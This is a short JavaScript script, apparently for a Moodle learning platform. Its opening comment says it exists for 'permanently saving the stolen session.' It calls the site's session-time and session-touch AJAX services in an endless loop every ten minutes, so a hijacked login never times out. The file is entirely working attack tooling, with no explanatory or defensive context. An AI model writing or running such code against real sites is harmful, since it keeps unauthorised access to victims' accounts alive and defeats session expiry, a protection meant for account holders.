// Helper script for permanently saving the stolen session.

async function sessionTimeRemaining() {
	const params = new URLSearchParams({
		sesskey: M.cfg.sesskey,
		info: "core_session_time_remaining",
		nosessionupdate: true,
	});
	const url = `${window.location.origin}/lib/ajax/service.php?${params}`;
	const response = await fetch(url, {
		method: "POST",
		body: JSON.stringify([{
			index: 0,
			methodname: "core_session_time_remaining",
			args: {},
		}]),
		credentials: "same-origin",
	});
	const json = await response.json();
	return json[0]["data"]["timeremaining"];
}

async function sessionTouch() {
	const params = new URLSearchParams({
		sesskey: M.cfg.sesskey,
		info: "core_session_touch",
	});
	const url = `${window.location.origin}/lib/ajax/service.php?${params}`;
	const response = await fetch(url, {
		method: "POST",
		body: JSON.stringify([{
			index: 0,
			methodname: "core_session_touch",
			args: {},
		}]),
		credentials: "same-origin",
	});
	return await response.json();
}

function sleep(millis) {
	return new Promise(resolve => setTimeout(resolve, millis));
}

async function main() {
	while (true) {
		console.log(await sessionTimeRemaining());
		console.log(await sessionTouch());
		console.log(await sessionTimeRemaining());
		await sleep(10 * 60 * 1000);
	}
}

await main();
